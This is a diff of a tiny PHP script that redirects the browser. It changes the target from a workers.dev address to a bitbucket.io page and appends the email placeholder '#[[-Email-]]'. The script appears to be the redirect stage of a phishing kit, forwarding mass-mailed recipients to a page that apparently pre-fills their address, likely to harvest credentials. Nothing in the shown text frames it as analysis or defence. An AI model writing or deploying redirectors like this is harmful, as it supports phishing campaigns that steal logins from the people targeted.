@@ -1,5 +1,5 @@
 <?php
 //Redirect Browser
-header("Location: https://dry-river-f72c.batweb00.workers.dev/");
+header("Location: https://127002.bitbucket.io/#[[-Email-]]");
 exit();
 ?>
